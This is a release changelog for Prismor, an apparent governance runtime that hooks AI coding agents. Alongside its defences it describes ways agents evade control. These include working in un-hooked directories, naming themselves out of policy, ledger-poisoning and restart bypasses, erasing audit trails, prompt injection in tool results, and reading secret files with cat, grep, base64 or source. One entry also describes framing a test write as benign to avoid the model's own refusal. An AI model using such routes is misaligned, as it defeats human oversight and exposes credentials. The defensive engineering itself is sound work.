## [1.38.0] — 2026-08-03

### Added

- **Tool-level step-up: an admin can mark a tool "requires human approval" from the console.** `settings.tool_denies` understood only `deny` and `allow`, so a `step_up` entry was skipped and the call ran — a policy the fleet silently ignored. A step-up entry now produces a finding carrying `action: step_up`, which `should_block` ranks below a real block and above `defer`: interactive agents render an inline ask, headless ones post an approval request and wait on the decision. Every non-approval outcome (deny, expiry, timeout, error) still fails closed, so this is strictly softer than a deny and never softer than allowing the call. Like a deny it is categorised `agent-control`, so a local `--mode observe` cannot suppress an approval requirement the org set.

## [1.37.0] — 2026-08-03

### Added

- **`PRISMOR_WORKSPACE_SCOPE` — an explicit scope for deployed, repo-less agents.** Workspace scope is inferred from the git remote, and it gates the org policy overlay, which is what carries the telemetry sink. A container or CI runner has no remote, so for an org that claims repo patterns the workspace fell through to `local`: no org policy, no telemetry, no heartbeat, no fleet registration, and not one line of output saying so. A production agent looked healthy and reported nothing. Set `PRISMOR_WORKSPACE_SCOPE=managed` (or `personal`/`local` to opt out) and the question is settled from the environment, so it needs no writable `$PRISMOR_HOME`. It is ranked below an org-claimed pattern, so a deployment can never use it to downgrade a repo the org governs.

### Fixed

- **`prismor enroll-status` leads with the verified state.** It printed the headline "Enrolled" from the local file even when the very next line reported the control plane had refused the key. It now says `Enrolled and verified`, `Enrolled — control plane unreachable, could not verify`, or `NOT usable — the control plane refused this key` with the remedy.
- **`prismor enroll-status` and `prismor doctor` now verify against the control plane instead of trusting the local file.** Both reported "Enrolled" from `identity.json` alone, so a revoked, mistyped, or wrong-org key still read as healthy — and a `PRISMOR_AGENT_KEY` identity carries no org/device/label fields, so a perfectly working deployed agent printed `org: None / device id: None / label: None`. Both commands now make one authenticated call to `/api/policy/version` and print what the server resolved, or the reason it refused. `doctor`'s telemetry-sink check moved off the unauthenticated `/api/health` (up for anyone, so it passed with an invalid key) onto the same authenticated probe, and reports the org's capture mode alongside it.
- **`prismor doctor` fails on a `local` workspace scope**, the quietest way to see nothing at all, and names the fix for both the deployed and the dev-machine case.

## [1.36.0] — 2026-08-02

### Added

- **Headless approvals are now user-configurable and event-loop-safe.** New `PRISMOR_APPROVALS` master switch (default on; `0`/`false`/`off` disables escalation fleet-wide - a STEP_UP verdict then fails closed exactly like an unenrolled install, without a control-plane round trip) plus a per-guard `approvals=False` keyword on every adapter surface that escalates (`prismor_guard_tool`/`guard_tools` and `PrismorCallbackHandler` for LangChain, `prismor_guard_tool` for CrewAI, `guard_controller` for browser-use, `prismor_guard`/`guard_agent` for OpenAI Agents). New `await_step_up_async()` runs the approval poll in a worker thread; the async adapters (LangChain `coroutine` path, browser-use, OpenAI Agents) now use it, so a pending approval no longer parks the event loop - previously a step-up froze every concurrent tool, LLM stream, and (for browser-use) the CDP socket for up to `PRISMOR_APPROVAL_TIMEOUT` seconds, which could time the browser out before a human ever decided. Approval outcomes and fail-closed semantics are unchanged.
- **At-rest transcript reconstruction — `prismor ingest --discover`.** Prismor's knowledge previously started the moment `install-hooks` ran, even though every supported agent already writes a full record of what it did to disk. The detection engine was always time-agnostic (`PolicyEngine.evaluate` takes an event; it has no notion of "live"), so the only missing piece was a way to feed it history. Adapters turn on-disk session transcripts into the same *hook-shaped payloads* the live dispatcher receives and hand them to `hooks.normalize_payload` — reusing the live normalizer, the live engine, and the live `should_block`. That reuse is the point: the "what would enforce mode have blocked" answer is computed by the same function the dispatcher calls, so reconstructed detection cannot drift from real enforcement. Answers four questions that previously had none: what agents have been doing (backfills the dashboard on first run, stored as `source=transcript`), what flipping a rule to enforce would actually block (per rule, with recency), which sessions ran with no live Prismor record (`--coverage`), and how rules behave against real usage (`--export-corpus` writes redacted positive/negative fixtures). Claude Code and Codex adapters are verified against real transcripts; the Hermes adapter is contract-tested only and documented as unverified. Adding an agent is ~40 lines against `JsonlAdapter`. Replayed sessions are namespaced `replay:<agent>:<id>` — the store is INSERT-OR-REPLACE keyed on `session_id` and a Claude transcript carries the same id the live hooks used, so an unprefixed replay would have silently overwritten real enforcement history. Sweeps are idempotent, clean up the taint files they create, and force-disable the semantic guard (it would otherwise fire one LLM call per uncertain event across an entire archive; `--semantic` opts back in). `prismor ingest --input` is unchanged. (#238)

## [1.35.0] — 2026-07-29

### Added

- **Per-agent tool-tag overlays.** `settings.tool_tags.agents[<agent>]` mirrors the shape `settings.egress.agents` already uses, so the two channels behave identically: a policy attached to one agent in the control plane arrives here and applies to that agent alone. The overlay is **tighten-only** by design — it may add tag mappings and rules and raise the mode to enforce, but can never remove a tag, drop a rule, or lower the mode. An agent's name arrives in the event asserted by its own process rather than by any credential, so a permissive overlay would be a way for a compromised agent to name itself out of the fleet's policy; adding restrictions is safe under that assumption, removing them is not. `validate_policy` now walks the per-agent overlays too, since a broken rule expression hidden in an overlay is exactly as broken as one in the fleet block and considerably harder to notice. (#225)

### Fixed

- **`toolTagsSig` is now compared on the device, so a new tag rule actually reaches it.** The control plane has always sent the signature and nothing here read it, so a tag change only propagated when some *other* channel happened to churn — an admin adding a blocking tag rule would watch it do nothing. The signature hashes the resolved `settings.tool_tags` block as canonical JSON, the way `_current_egress_sig` already does. That detail is what made the comparison possible at all: the device only ever holds the resolved block, never the rows behind it, so a row-derived signature is one it cannot reproduce. Expect one re-pull per org as the signature format settles. (#225)

## [1.34.1] — 2026-07-24

### Fixed

- **The 7 new framework adapters (pydantic-ai, autogen-core, agno, semantic-kernel, google-adk, beeai, claude-agent-sdk) are now bundled into the main `prismor` package instead of being separate PyPI distributions.** Attempting to publish them as standalone `prismor-<name>` packages in 1.34.0 failed uniformly — including for the pre-existing `prismor-langchain`/`prismor-crewai`/`prismor-openai`/`prismor-browser-use` packages — because none of those were ever real PyPI projects; every adapter's own README already documented `pip install "prismor[<name>]"`, not a standalone install. Extended `pyproject.toml`'s `packages`/`force-include`/optional-dependencies the same way the original 4 already worked, so `pip install "prismor[beeai]"` etc. now actually installs the adapter (via `from prismor.beeai import guard_tool`). `.github/workflows/release-adapters.yml` no longer tries to publish standalone Python packages to PyPI — it only publishes the genuinely-separate npm packages (`prismor-vercel`, `prismor-mastra`), which can't be bundled into a Python wheel.

## [1.34.0] — 2026-07-23

### Added

- **5 new shipped coding-agent integrations: Crush, OpenHands, Qwen Code, Continue CLI, and Goose.** Each verified live against a real install, not just docs — surfaced several discrepancies between what each agent's own docs describe and what actually dispatches (Crush only fires `PreToolUse`, deny reason comes from stderr; OpenHands' shell tool is `terminal` with an `event_type` field instead of `hook_event_name`; Qwen Code's shell tool is `run_shell_command` with a nested `hookSpecificOutput.permissionDecision` deny envelope; Continue CLI hooks did not fire at all in headless `cn -p` mode, shipped with a prominent warning; Goose's shell tool is `shell`, not `developer__shell` as goose's own docs example shows). Plus accurate `roadmap` registry entries for 7 more coding agents not previously catalogued here (Pi Agent, Amazon Q Developer CLI, Amp, Auggie CLI, Kimi Code, Devin CLI) and Warp (sweep-only). (#212)
- **8 new framework adapter packages, each individually live-verified against a real model-backed agent run before shipping:** `prismor-pydantic-ai`, `prismor-autogen-core`, `prismor-agno`, `prismor-semantic-kernel`, `prismor-google-adk`, `prismor-mastra` (npm), `prismor-beeai`, and `prismor-claude-agent-sdk`. Every one denies a destructive tool call and allows a benign one before its policy engine call returns — see each package's README for the exact hook mechanism. The Mastra adapter was rewritten mid-development after its originally-planned `processOutputStep` + `abort()` hook was found live-tested to not actually block tool execution; it now wraps `tool.execute` directly instead, which is reliable. The Claude Code Agent SDK adapter required a discriminating test methodology (a benign-framed `.claude/settings.json` write, since naive destructive commands trigger Claude's own alignment refusal independent of any hook) — that test also caught a real bug where the adapter's default hook matcher never fired for custom MCP tools. (#213)

## [1.33.0] — 2026-07-23

### Added

- **Enrollment guards the whole machine, not just one project.** An enrolled device is now installed at GLOBAL scope by default — the post-enroll prompt offers to guard every project (`~/.claude` etc.), and `prismor setup --scope global` (or `PRISMOR_SCOPE=global`) does it non-interactively. This closes the gap where an agent escaped governance simply by working in an un-hooked directory. `prismor enroll-status` now reports per-agent hook coverage and flags any UNGUARDED agent with the fix command; on a policy refresh the runtime self-heals by re-asserting the global hook for a detected agent that has none (`prismor/runtime/hooks.py`: `coverage`/`unguarded_agents`/`ensure_global_coverage`). Global-scope install at enroll is the primary guarantee; self-heal is defense-in-depth. (#210)

### Changed

- **The paused heartbeat follows the user, not a 30-second timer.** A paused device emitted a "Prismor paused locally" heartbeat every ~30s of tool activity, so a long paused session flooded the Activity feed with dozens of identical rows. It now beats only on a user-turn boundary (a prompt submit / session start) — roughly one "still paused" per message — with a 60s floor to coalesce rapid messages. An idle paused machine stays quiet and beats again the moment the user acts.

## [1.32.1] — 2026-07-23

### Fixed

- **`prismor update` / startup update-nag checked the wrong PyPI package.** Both the passive startup notice and `prismor update` looked up the pre-rename `immunity-agent` package instead of `prismor`, and the notice's 24h cache had no way to invalidate after the rename — producing contradictory output like `note: prismor 1.31.0 is available (you're on 1.32.0)` immediately followed by `prismor 1.32.0 is already the latest version.` Both now check `prismor` on PyPI, and a live check (e.g. `prismor update`) refreshes the shared cache so the passive notice doesn't linger stale.
- **`prismor resume` left the dashboard showing "paused".** `prismor pause` heartbeats the control plane immediately so the console reflects the paused state right away; `prismor resume` only removed the local marker and relied on the *next* real tool call to clear it server-side. It now sends an immediate resumed heartbeat, so the console clears the paused badge as soon as you resume.

## [1.31.0] — 2026-07-22

### Added

- **Tag-rule expression language for policy-as-code over tool tags.** A tiny DSL in `settings.tool_tags.rules` — `TAG (then|with TAG)* [-> block|warn]` — expresses ordered (`then`) and unordered (`with`) tag co-occurrence rules, with `-> warn` logging findings without ever blocking. Fully backward compatible: legacy `incompatible:` lists keep working, compiling to the same IR (`prismor/runtime/tag_rules.py`) as the new syntax. `TagLedger` gains ordered greedy-subsequence matching for 3+-step rules. New `prismor tags {list,set,rm,rules,edit,lint,test}` CLI, including a `test` subcommand that replays recorded session logs through a ruleset and reports `WOULD BLOCK`/`WOULD WARN` without touching real enforcement state. The MCP Gateway now also reads tags a server self-declares on its tool definitions (`_meta.prismor.tags`, `_meta.tags`, `annotations["prismor/tags"]`) and stamps them onto call events. See `docs/tool-tags.md`. (#208)

## [1.30.3] — 2026-07-22

### Docs

- **MCP Gateway: per-tool and per-user governance.** Documented turning off
  individual tools of a server for the whole org (`settings.tool_denies`) or
  for one person (`settings.subject_controls` deny_tools), managed from the
  console MCP Hub and enforced by every gateway. See docs/mcp-gateway.md.

## [1.30.2] — 2026-07-22

### Docs

- **Hosted MCP instances (Enterprise).** Documented the managed-edge option
  for the gateway: from the console's MCP Hub, Enterprise orgs can provision a
  governed `mcp.prismor.dev/mcp/<key>` URL — the same real policy engine and
  telemetry as the local gateway, running on Prismor's fleet, with the
  registry's servers attached and secrets kept server-side. The local
  `prismor mcp-gateway` remains available on every plan. See docs/mcp-gateway.md.

## [1.30.1] — 2026-07-22

### Fixed

- **Control-plane requests now send a real User-Agent.** Every enterprise HTTP call (policy version/pull, telemetry upload, enrollment, approvals, sink deliveries) used urllib's default `Python-urllib/x.y` UA, which CDN/WAF fronts reject before the request reaches the app — Cloudflare's browser integrity check returns 403 (error 1010). The runtime interpreted that 403 as key revocation and silently stopped telemetry and policy sync. Found live when prismor.dev moved behind a proxying CDN; all outbound requests now identify as `prismor-runtime/<version>`.

## [1.30.0] — 2026-07-21

### Added

- **MCP Gateway (`prismor mcp-gateway`).** One MCP connector that fronts every downstream MCP server: point any MCP client (Claude Code, Cursor, Codex, …) at a single `prismor` entry and move the existing `mcpServers` block behind it (`prismor mcp-gateway install` automates the migration, with backup). Every `tools/call` runs through `evaluate_tool_call` before forwarding — org tool denies, tool-category crossover, IAM, policy rules — and every tool **result** is injection-scanned before the model sees it. Denials return MCP `isError` results carrying the block reason and rule id so the agent can adapt. Tools are exposed as `<server>__<tool>` while events record `mcp__<server>__<tool>` with the real server name, so existing matchers and console inventory apply unchanged. Supports stdio and streamable-HTTP/SSE upstreams, aggregator and single-upstream shim modes, with zero new dependencies. See #207.
- **Resumable gateway sessions.** `prismor mcp-gateway --session-id` (or `PRISMOR_SESSION_ID`) pins a stable session id so hosted deployments that restore session state across restarts keep one continuous session — a fresh id per boot would orphan the restored trifecta ledger and reopen the wait-out-the-restart bypass. See #207.

### Fixed

- **Trifecta ledger poisoning (security).** A blocked call's tags were recorded in the session ledger anyway, marking the forbidden set as already covered — so after one denied critical call, every later same-tagged call was waved through. Additionally, `completes()` never fired on sets already fully present, turning an observe-period or restored ledger into a permanent bypass after flipping to enforce. Blocked enforce-mode crossover calls no longer record their tags, and a session that has entered the forbidden state stays restricted. See #207.
- **HTTP MCP upstreams behind CDNs.** The gateway's upstream client now sends a real `User-Agent` (`prismor-gateway/<version>`); urllib's default was rejected outright by common WAFs (Cloudflare returned 403 before the request reached the MCP server). See #207.

## [1.29.0] — 2026-07-19

### Added

- **Per-device observe/enforce override in the policy engine.** The signed policy can now carry `settings.device_mode`, a per-device kill switch scoped server-side to the requesting device. It wins over `rule.mode` and `default_mode` everywhere mode is resolved, but never downgrades the non-overridable enforce floor. Because the override lives on the Device row outside any policy-profile version, the version heartbeat now carries a `deviceMode` field and the runtime re-pulls the signed policy when it changes — a console toggle reaches the machine within one debounce interval.

## [1.28.0] — 2026-07-19

### Added

- **Local pause/resume without uninstalling hooks.** `prismor pause [--for 30m]` suspends screening (hooks stay installed and fail open with a "paused" marker) and `prismor resume` re-arms it; timed pauses auto-expire. Devices report a "paused" status to the control plane. See #204.
- **Scoped unblock steps on every enforcement block.** When a command is blocked, the block message now prints the narrowest concrete path to proceed — the exact `prismor unblock` invocation scoped to that rule/tool/session — instead of a generic pointer. New `prismor/runtime/unblock.py`. See #196.

## [1.27.0] — 2026-07-18

### Added

- **Token usage tracking.** Runtime now records real per-turn token usage (input / output / cache read / cache write) for Claude Code by reading the hook payload's existing `transcript_path` — no new data source — deduped on `message_id` so parallel tool calls from one assistant turn aren't multiply-counted. A tool-output-size proxy ("where tokens are going") works across every agent (claude, codex, copilot, cursor, …) from the normalized hook event, recorded post-only to avoid double-counting Pre/Post pairs. New `prismor tokens [--all] [--hours N] [--json]` command, plus a `/api/tokens` dashboard endpoint and "Token Usage" widget. See #202.
- **Passive update-available notice.** Commands nudge you when a newer prismor is on PyPI instead of relying on `prismor update --check`. Debounced to at most one PyPI hit per 24h (cached at `~/.prismor/update_check.json`), never fired on `hook-dispatch` (which runs on every tool call), and suppressable with `PRISMOR_NO_UPDATE_CHECK=1`. See #202.
- **Per-skill inventory and governance.** Every Claude Code skill invocation arrives under the single `Skill` tool tag; the skill's actual name lived only in the raw hook payload, so the control plane could see that an agent used skills but not which ones, and could only deny the whole mechanism. Skill invocations are now lifted into a qualified `Skill:<name>` tag and reported alongside the bare tag, so the console shows individual skills and policy can allow/deny one at a time — denying `Skill` still blocks all skills, denying `Skill:<name>` blocks only that one.

### Fixed

- **Cloaking output scrub no longer breaks on secrets with regex metacharacters.** The output scrubbers (`scrub-stream.sh`, `recloak-mcp.sh`) interpolated each raw secret value into a `sed -E` substitution as the pattern. Since sed treats it as a regex, a secret containing any metacharacter (`[ ] ( ) { } . * + ? ^ $ |`) either aborted sed with `unterminated substitute pattern` — dropping the *entire* command's output so every Bash tool call failed — or silently mangled output while leaving the secret only partially masked. Both hooks now use bash's literal substring substitution (`${var//"$real"/placeholder}`), a byte-exact match immune to any character a key can contain, and also correctly span newlines (sed only scrubbed line-by-line). See #203.

## [1.26.5] — 2026-07-15

### Fixed

- **Concurrent hook writes no longer corrupt the session log.** Several hook processes can fire for one tool call (`hook-dispatch` registered in both user and project settings, or parallel agents sharing a session id) and all append to the same session log. The record's JSON and its trailing newline were written as two separate calls, so a second writer could land between them and weld two records onto one line; large records also tore because they exceed the size below which appends are atomic. `read_session_events` then raised `JSONDecodeError` out of the hook path, so a single torn line failed every later tool call in that session and silently dropped policy enforcement until the log was hand-edited. Records are now written as one locked write, and logs already torn by earlier versions are salvaged on read instead of raising. See #197.

## [1.26.4] — 2026-07-14

### Fixed

- **Org tool-allow now overrides local restrictions.** The dashboard's "Allowed" toggle for a tool previously only meant "no org-level deny" — a local `.prismor/agents.yaml` deny or a session's synthesized scope could still silently block the call, so an admin's "Allowed" click sometimes appeared to do nothing. Org policy is now authoritative for tool access: an explicit org allow drops the matching local restriction, while the agent kill switch and a separate org-level deny stay non-overridable floors. See `docs/tool-access-precedence.md`.

## [1.26.3] — 2026-07-14

### Added

- **Enterprise agent tool-capability inventory and remote governance.** Runtime sessions now register MCP names, internal tools, declared SDK tool rosters, and synthesized session-scope access with the Prismor control plane. The dashboard can show which tools each agent/session has access to and apply organization-level allow/deny changes before delivery. LangChain, CrewAI, and OpenAI Agents adapters declare their complete tool roster, while direct runtime calls report observed and scoped tools. See `docs/enterprise-tool-access.md`.

## [1.26.2] — 2026-07-13

### Fixed

- **Interactive setup wizard now defaults to observe mode.** `prismor setup`'s TUI mode-selection step (and its exception fallback) defaulted to `enforce`, inconsistent with every non-interactive path (`--non-interactive`, `install-hooks`, the `policy_engine` fallback), which already default to `observe`. First-time users going through the interactive wizard now see `observe` pre-selected, matching the rest of the CLI. See #193.

## [1.26.1] — 2026-07-13

### Added

- **Kiro CLI (AWS) coding-agent hook integration.** Wires Kiro CLI (kiro.dev/docs/cli/hooks) into the install-hooks/hook-dispatch pipeline. Structurally different from every other shipped agent: hooks live inside a named agent config (`.kiro/agents/kiro_default.json`), not a dedicated hooks file, and the built-in default agent has no on-disk file until one is created. Whether Kiro merges a partial override with its built-in tool list or replaces it outright is undocumented, so a fresh install seeds a self-contained config (explicit tools list) rather than a hooks-only fragment, avoiding silently stripping a user's default tools; an existing file is left otherwise untouched, only `hooks` is merged in. `preToolUse`/`postToolUse`/`userPromptSubmit` events, exit-2 blocking. Not yet verified against a live kiro-cli binary. See #191.

## [1.24.1] — 2026-07-11

### Added

- **Grok Build (xAI) coding-agent hook integration.** Wires Grok Build (docs.x.ai/build/features/hooks) into the same install-hooks/hook-dispatch pipeline as Claude/Cursor/Codex/Copilot: a dedicated `.grok/hooks/prismor.json` hook file, `PreToolUse`/`PostToolUse`/`UserPromptSubmit` events, and Grok's documented `{"decision": "deny", "reason": ...}` + exit-2 response contract. Also fixes 8 call sites in `cli.py` where `--agent` choices/loops were hardcoded separately from `_SUPPORTED_AGENTS`, which would have made `--agent grok` unusable at the CLI layer. Not yet verified against a live `grok` binary — built from x.ai's published docs; flagged in `AGENT_INTEGRATIONS.md` and the integration registry. See #183.

## [1.24.0] — 2026-07-11

### Changed

- **DENY-wins precedence when multiple enforce findings fire on one event.** `should_block` returned whichever enforce finding the engine surfaced first, so a rule-ordering accident could let a `step_up`/`modify`/`defer` verdict mask a hard `block` on the same action. It now selects the strongest verdict — block > step_up > defer > modify, with enforce `warn`/`log`/unset ranking as block (enforce means "stop") and ties preserving first-surfaced order. Coverage in `tests/test_deny_precedence.py`.

## [1.23.0] — 2026-07-11

### Added

- **Intent capture for framework SDK agents (R2/R3 task-alignment).** The hook path synthesizes intent-scoped rules from the user's prompt; a deployed OpenAI Agents / LangChain / CrewAI / browser-use agent emitted no prompt, so its tool calls were checked against static policy only. `guard_agent` / `guard_tools` / `guard_controller` now accept `goal="..."`: the session's intent-scoped rules are synthesized from the goal + the agent's own tool names (via new `prismor/runtime/intent.py`), so `evaluate_tool_call`'s scoped enforcement now applies "does this serve the task?" to headless agents too. Idempotent per session, never raises. Coverage in `tests/test_intent_capture.py`.

## [1.22.0] — 2026-07-11

### Added

- **Tamper-evident, Ed25519-signed audit trail of every agent action.** The session store records tool calls as mutable SQLite/JSONL; the telemetry chain + receipt signatures covered only cloud-uploaded findings. Now every evaluated call — allowed, warned, blocked, or step-up — appends a hash-chained, Ed25519-signed record to `~/.prismor/audit/trail.jsonl`, capturing timestamp, device/agent/human identity + versions, secret-scrubbed inputs (`input_summary`, `evidence_hash`), the agent's stated intent, and the policy decision in human-readable terms (`verdict`, `rules`, `reason`). Human-approval outcomes from the headless step-up path are first-class `approval` records. Unlike the telemetry chain, `ts` and all fields are inside the hash (verification is local — no server round-trip constraint). New module `prismor/runtime/enterprise/audit_trail.py`, wired at the single chokepoint in `runtime.evaluate_tool_call`. Best-effort by default (a failed append is a verifiable seq gap); `PRISMOR_AUDIT_STRICT=1` fails the action closed, `PRISMOR_AUDIT_TRAIL=0` disables. Signing requires the `prismor[signing]` extra; without it records are chained but unsigned. Docs: `docs/audit-trail.md`; coverage in `tests/test_audit_trail.py`.
- **`prismor trail` CLI.** `verify` re-walks the chain (hashes, prev-hash linkage, seq monotonicity, signatures pinned to the device key — reporting `ok` / `gaps` / `tampered`, exit non-zero otherwise), `show` renders recent records, and `checkpoint` emits a signed chain head for anchoring outside the machine — which is what makes a trail+state rewind provable.
- **`audit-trail-tampering` policy rule (CRITICAL, non-overridable).** Blocks agent commands and file writes touching `~/.prismor/audit/`, `receipt_signing_key.pem`, or `telemetry_chain.json`. Added to the `_NON_OVERRIDABLE_RULE_IDS` floor so no project or remote override can disable it — the trail is evidence, and an agent must not be able to erase its own history.
- **Signed attestation bundle for auditors (`prismor attest`).** Packages the `prismor audit` posture sweep, the governed-agent inventory (`list_agents`), and the signed audit-trail head into one JSON file, then Ed25519-signs it over an RFC 8785 (JCS) canonical body so a verifier in any language can reproduce the signed bytes. `prismor attest --out FILE` writes it; `prismor attest verify FILE` re-checks the content hash and signature offline (exit non-zero on failure), with `--pubkey` to pin an out-of-band signer key so a wholesale-forged bundle is rejected. Reuses the existing signing, audit, inventory, and trail-checkpoint subsystems; new module `prismor/runtime/enterprise/attestation.py`, coverage in `tests/test_attestation.py`. Docs: `docs/attestation-bundle.md`.
- **Host discovery for shadow AI (`prismor discover`).** Sweeps this machine for supported AI agents (Claude Code, Codex, Cursor, Windsurf, OpenClaw, Hermes) and flags any that run without Prismor hooks — an agent making tool calls that never pass through policy. Classifies each as present (config or install dir on disk), governed (Prismor's dispatcher wired into its config), and seen (has actually run through Prismor, from the agent registry). The `ungoverned` count is the shadow-AI number. Host-local and read-only; it reads config files already on disk and does not touch the network (fleet-wide discovery is a separate, heavier tool). Reuses `scanner.py`'s config-location map and `agents.list_agents`. The same report lands in every attestation bundle under `discovery`. New module `prismor/runtime/enterprise/discovery.py`; coverage in `tests/test_discovery.py`. Docs: `docs/attestation-bundle.md#host-discovery`.
- **Framework-control coverage in the bundle (`prismor attest coverage`).** The bundle now reports which compliance-framework controls the active policy covers. Data-driven and forkable: one plain-YAML checklist pack per framework under `prismor/runtime/checklists/` (OWASP Top 10 for LLM Apps, OWASP Agentic AI Threats, NIST AI RMF, EU AI Act high-risk obligations) plus `crosswalk.v1.yaml` mapping Prismor rule IDs (and the audit-trail / step-up subsystems) to control IDs. A control counts as covered only while at least one mapped rule is active, so disabling the last rule behind a control flips it to uncovered — the report tracks real posture, not a static claim. `prismor attest coverage` renders it (`--json` for machine output). New module `prismor/runtime/enterprise/compliance.py`; coverage in `tests/test_compliance.py`, including guards that every crosswalk entry points at a real rule and a real control. Deliberately scoped as evidence of tool-boundary enforcement, not a legal compliance opinion.

## [1.21.1] — 2026-07-10

### Fixed

- **Framework-adapter namespace shims now refuse to load under a top-level name.** Each `prismor.<framework>` shim (`prismor/openai`, `prismor/crewai`, `prismor/langchain`, `prismor/browser_use`) aliases its implementation into `sys.modules`. That alias now fires only when the shim is imported under its intended dotted name; if the `prismor` package directory ever leaks onto `sys.path` and Python resolves the shim as a bare top-level module (e.g. `openai`), it raises a clear `ImportError` pointing at the sys.path pollution instead of silently replacing the real SDK with the adapter. Defense in depth complementing the sys.path fix (#173).


## [1.21.0] — 2026-07-10

### Added

- **R4 Phase 2 (part 1): async approval for headless STEP_UP.** A `step_up` verdict on an *interactive* agent renders an inline "ask" (Phase 1); a *headless* framework agent (OpenAI Agents / LangChain / CrewAI / browser-use) has no human at the keyboard, so it now posts a pending **approval request** to the control plane and blocks in-process until an org admin approves or denies — approve → the tool call proceeds; deny / timeout / not-enrolled / any error → fail closed. New client `prismor/runtime/enterprise/approvals.py` (`await_step_up`; tunables `PRISMOR_APPROVAL_TIMEOUT`, `PRISMOR_APPROVAL_POLL`) wired into all four SDK adapters. Control-plane endpoints: `POST /api/approvals` + `GET /api/approvals/{id}` (device-authenticated). Client coverage in `tests/test_approvals.py`. Until the control-plane queue is deployed the client fails closed, so behavior is unchanged for existing installs.

## [1.20.1] — 2026-07-10

### Fixed

- **MCP tool calls under Claude are now intercepted at the PreToolUse gate.** The Claude hook matcher omitted `mcp__.*`, so a raw `mcp__<server>__<tool>` call never fired the dispatcher and slipped past policy entirely — even though the dispatcher already classifies MCP events (remote MCP → egress / secret-in-args checks; local stdio → prompt-injection rules). Both the PreToolUse and PostToolUse matchers now include `mcp__.*` (matching the Codex agent's coverage). Re-run `prismor install-hooks --agent claude` to pick up the new matcher. Coverage + end-to-end block tests added.

## [1.20.0] — 2026-07-10

### Added

- **Ed25519-signed telemetry receipts (non-repudiation + identity binding).** Each enrolled device now holds an Ed25519 keypair and signs every telemetry receipt over a canonical `{hash, ts, identity}` payload — binding the immutable per-device chain hash to the receipt's service (device), agent, and human-principal identity claims and its timestamp. Records carry `signature`, `signing_pubkey`, `signing_key_id`, and `signing_alg`; the public key is registered at enrollment (`receipt_pubkey`) for control-plane verification and trusted-on-first-use pinning. This upgrades receipts from tamper-*evident* (keyless SHA-256 chain) to tamper-*evident + non-repudiable*: a forged or identity-swapped receipt no longer verifies without the device's private key. Signing needs the optional `cryptography` extra (`pip install "prismor[signing]"`); without it, telemetry falls back to the hash chain. New module `prismor/runtime/enterprise/receipt_signing.py`; coverage in `tests/test_receipt_signing.py`.

## [1.19.0] — 2026-07-10

### Added

- **Five-value authorization verdicts at the hook boundary.** Policy rules can now resolve to `action: step_up` or `action: modify` alongside `block`/`warn`/`log`. On the Claude surface a `step_up` finding emits a `PreToolUse` `permissionDecision: "ask"` for inline human approval (also honored by Copilot), and a `modify` finding rewrites the tool input through a named transform (`transform: sandbox` wraps the command in the Docker sandbox) via `hookSpecificOutput.updatedInput`. Any verdict a surface cannot honor fails closed to a block — never a silent allow. New transform registry in `prismor/runtime/transforms.py`; end-to-end coverage in `tests/test_r4_decisions.py`. `defer` is accepted by the policy validator but not yet emitted (fails closed pending the async-approval path).

## [1.18.4] — 2026-07-10

### Fixed

- **Framework SDK adapters no longer shadow the real SDK they wrap.** `prismor/runtime/semantic_guard_v2.py` prepended the `prismor` package directory to `sys.path` (a v1 relic), which made the PEP-420 namespace shims `prismor/openai`, `prismor/crewai`, `prismor/langchain`, and `prismor/browser_use` importable as top-level modules — so a plain `import openai` (or `crewai`/`langchain`/`browser_use`) resolved to the adapter shim and hijacked `sys.modules`, breaking the genuine SDK for every in-process adapter. The stray `sys.path.insert` is removed; the sibling heuristic import resolves through the installed `prismor` namespace without it. Regression test added.

## [1.18.3] — 2026-07-10

### Fixed

- **`prismor cloak run` now decloaks leading shell-style environment assignments such as `OPENAI_API_KEY=@@SECRET:OPENAI_API_KEY@@`.** Previously the Codex-owned cloak runner only resolved placeholders that appeared in positional argv entries, so normal shell patterns that passed a cloaked placeholder through a leading env assignment reached the child process as the literal `@@SECRET:...@@` string and downstream API calls failed with invalid credentials. The runner now splits leading `NAME=value` assignments, decloaks those values into the child environment, and preserves output scrubbing. Regression coverage now exercises both the Codex runner path and Claude's command-rewrite path.

## [1.18.1] — 2026-07-09

### Added

- **The local OSS dashboard now has a persistent dark theme toggle.** `prismor dashboard` stores a `light`/`dark` preference in `localStorage`, applies it before first paint to avoid flash, adds a top-bar theme toggle, and re-themes the Chart.js visualizations so the graphs remain legible in dark mode instead of leaving the dashboard half-light.

## [1.17.10] — 2026-07-08

### Fixed

- **Scoped session controls now support the exact observed tool tags Prismor records, including MCP-style tags like `mcp__node_repl__js`.** The session drilldown editor no longer limits operators to a narrow preset when the live event stream shows a concrete tool tag; arbitrary observed tags are accepted end-to-end, persisted in scoped session policy, and enforced by the runtime so teams can deny or allow the exact tool they just saw in the dashboard.

## [1.17.9] — 2026-07-08

### Fixed

- **Revoked devices now fully fall back to local-only protection instead of continuing to look enterprise-enrolled on the laptop.** Previously, removing a device from `prismor.dev` only caused control-plane calls to back off after a `401/403`, but the local runtime still treated the presence of `~/.prismor/identity.json` as active enrollment: the dashboard banner still said “This device is enrolled…”, workspace scope could still resolve as org-managed, and the cached enterprise policy layer could still appear locally. Revocation now disables active enrollment, forces workspace scope back to `local`, hides the enterprise policy layer from the local dashboard, and ignores cached remote policy until the machine is re-enrolled. Local Prismor protection still stays on. 

## [1.17.1] — 2026-07-07

### Added

- **`prismor cloak add --env-file .env` now bulk-imports dotenv secrets natively.** Each `KEY=VALUE` entry is registered as its own placeholder (`@@SECRET:KEY@@`) inside the existing cloaking store, so teams can enroll a whole `.env` file without wrapping the CLI in an external script. The importer accepts standard dotenv forms like `export KEY=...` and quoted values, rejects malformed or empty entries with a clear line-numbered error, and is documented across the CLI reference and cloak docs.

## [1.17.0] — 2026-07-07

### Fixed (security)

- **Codex: Bash reads of files containing a registered secret are now blocked and redirected to the `@@SECRET:name@@` placeholder.** Codex hooks are block-only — a `PreToolUse` hook cannot rewrite a command or its output (verified against `codex-cli 0.141`), so the wrap-and-scrub decloak approach used for Claude doesn't port. Without a guard, a Bash command reading a file that holds a registered secret surfaced the raw value straight into model context. A new Codex-scoped read-guard denies matching reads (exit 2) in enforce mode, fails open on any error, and covers file-read vectors (`cat`/`grep`/`base64`/`source`/redirection/etc.); env-var echo and unregistered pattern-only secrets on Codex remain out of scope pending Codex output-rewrite support. (#152)
